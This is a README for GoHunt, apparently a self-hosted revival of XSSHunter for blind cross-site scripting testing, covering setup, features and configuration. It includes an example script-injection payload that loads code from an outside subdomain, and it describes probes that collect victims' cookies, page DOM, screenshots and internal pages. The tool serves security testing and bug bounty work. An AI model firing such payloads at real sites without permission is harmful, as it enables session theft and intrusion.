# GoHunt

A revival of [XSSHunter](https://github.com/mandatoryprogrammer/xsshunter), `GoHunt` brings all your favorite `XSSHunter` functionality. Plus quality of life improvements!

![image](https://github.com/user-attachments/assets/310053ad-0d92-42bc-ae72-fa439e567373)

![image](https://github.com/user-attachments/assets/3dd8a917-b313-4c34-929d-4df67c648c31)

![image](https://github.com/user-attachments/assets/d2a48ad0-cf17-48a6-a58b-055432efcb8c)

![image](https://github.com/user-attachments/assets/14bd78dd-9938-43ef-919a-0c1b87e5241c)


Main changes:
- Single golang binary or docker deployment
- Additional notification methods 
- Bulk deletion/editing 
- Single Sign on


## Requirements
* A domain name
* Docker/Podman
* Ability to set DNS records

## Setup

Set a wildcard DNS record to your GoHunt instance
```sh
example.com A <YOUR INSTANCE IP>
*.example.com CNAME example.com
```

Create an `.env` file, you can use the `.env.dev` as a template.
```sh
DOMAIN=localhost:8081
GOHUNT_USERNAME=test
DB_PASSWORD=averystrongpassword
#GOHUNT_PASSWORD=yourstrongpasswordhere (optional)
```

Remember to set your `DOMAIN`!

Start the `docker-compose.yaml`:
```sh
docker compose -f docker-compose.yaml up -d
```

Thats it!

## Summary of Functionality
*Upon signing up you will create a subdomain such as `yoursubdomain.example.com` which identifies your XSS vulnerabilities and hosts your payload. You then use this subdomain in your XSS testing, using injection attempts such as `"><script src=//yoursubdomain.example.com></script>`. GoHunt will automatically serve up XSS probes and collect the resulting information when they fire.*

## Features
* **Single Sign-on** GoHunt supports OIDC for logging in to your service
* **User Management** Admin users can update and edit user records
* **Managed XSS payload fires**: Manage all of your XSS payloads in your GoHunt account's control panel, including bulk deleting
* **Powerful XSS Probes**: The following information is collected everytime a probe fires on a vulnerable page:
    * The vulnerable page's URI 
    * Origin of Execution 
    * The Victim's IP Address 
    * The Page Referer 
    * The Victim's User Agent 
    * All Non-HTTP-Only Cookies 
    * The Page's Full HTML DOM 
    * Full Screenshot of the Affected Page 
    * Responsible HTTP Request (If an GoHunt compatible tool is used) 
* **Full Page Screenshots**: GoHunt probes utilize the HTML5 canvas API to generate a full screenshot of the vulnerable page which an XSS payload has fired on. With this feature you can peak into internal administrative panels, support desks, logging systems, and other internal web apps. This allows for more powerful reports that show the full impact of the vulnerability to your client or bug bounty program.
* **XSS Payloads Fire Notifications**: XSS payload fires also send out **webhooks** or **email** notifications, your choice!
* **Automatic Payload Generation**: GoHunt automatically generates XSS payloads for you to use in your web application security testing.
* **Correlated Injections**: Perhaps the most powerful feature of GoHunt is the ability to correlated injection attempts with XSS payload fires. By using an [GoHunt/XSSHunter compatible testing tool](https://github.com/mandatoryprogrammer/xsshunter_client) you can know immediately what caused a specific payload to fire (even weeks after the injection attempt was made!).
* **Option PGP Encryption for Payload Emails**: Extra paranoid? Client-side PGP encryption is available which will encrypt all injection data in the victim's browser before sending it off to the GoHunt service.
* **Page Grabbing**: Upon your XSS payload firing you can specify a list of relative paths for the payload to automatically retrieve and store. This is useful in finding other vulnerabilities such as bad `crossdomain.xml` policies on internal systems which normally couldn't be accessed.
* **Secondary Payload Loading**: Got a secondary payload that you want to load after GoHunt has done it's thing? GoHunt offers you the option to specify a secondary JavaScript payload to run after it's completed it's collection.
* **Confidential Mode**: Dont want to send any details with your notifications? To be safe, this option only means you get notification and no details to your **slack**, **discord**, or email inbox

## Advanced

### Using alternative reverse proxies

GoHunt requires the `X-Forwarded-Proto` and `X-Forwarded-For` headers if running behind a reverse proxy. 
Caddy, by default sends these headers. 
To parse `X-Forwarded-For` GoHunt also needs to be configured with how many proxies are in-front of your instance, so please set `number_proxies` in the yaml config, or the `NumberProxies` environment variable

## Environment variables

Here is the list of environment variables that gohunt takes. 
Please read the `Using config file` section for each environment variable purpose.

`Domain`  
`ListenAddress`  
`NumberProxies`  
`Features.Signup.Enabled`  
`Features.Oidc.Enabled`  
`Features.Oidc.PublicURL`  
`Features.Oidc.IssuerURL`  
`Features.Oidc.ClientID`  
`Features.Oidc.ClientSecret`  
`Features.Oidc.AdminGroupClaimName`  
`Features.Oidc.AdminGroup`  
`Notification.SMTP.Enabled`  
`Notification.SMTP.Host`  
`Notification.SMTP.Port`  
`Notification.SMTP.Username`  
`Notification.SMTP.Password`  
`Notification.SMTP.FromEmail`  
`Notification.Webhooks.Enabled`  
`Notification.Webhooks.SafeDomains`  
`Notification.Confidential`  
`Database.Host`  
`Database.Port`  
`Database.User`  
`Database.DBname`  
`Database.SSLmode`  
`Database.Password`  


## Using config file

If you want to use a yaml config file instead of passing everything via `ENV` variables, use the `config.yaml.example` as a template, and add the following to your docker compose in the `gohunt` section:

```yaml
volumes:
    - ./config.yaml:/config/config.yaml:ro
```

The following is all the configuration options and their purpose:
```yaml
domain:         (string) Your gohunt instance domain (add port if not default 443/80)
listen_address: (string) The ip:port combination start the golang http server on
number_proxies: (int)    Used to parse X-Forwarded-For
features: 
  signup:
      enabled: (bool) Enable or disable account creation
  oidc:
   enabled:                (bool)   Enable or disable OIDC SSO integration
   public_url:             (string) URL of Gohunt instance (option can be determined from domain)
   issuer_url:             (string) Identity provider URL
   client_id:              (string) OIDC Client ID
   client_secret:          (string) OIDC Client Secret
   admin_group_claim_name: (string) Claim with user groups in it (optional)
   admin_group_name:       (string) Group that indicates user should be administrator of instance (optional)

  notification:
    confidential:   (bool) Whether to add xss vulnerablity details to notification
    smtp:
      enabled:      (bool)   Enable or disable sending notifications via SMTP
	  host:         (string) Host domain/ip
	  port:         (int)    Port
	  username:     (string) Mailing username
	  password:     (string) Mailing password
	  from:         (string) The sending email address
    webhooks:
      enabled:      (bool) Enable or disable sending notifications via webhooks
      safe_domains: (string array) List of domains that are safe to send to, defaults to [discord.com, slack.com]

  database:
	  host:     (string) Host domain/ip
	  port:     (string) Port
	  user:     (string) Database user
      password: (string) Database user password
	  dbname:   (string) Which database to use
	  sslmode:  (string) postgres sslmode
```
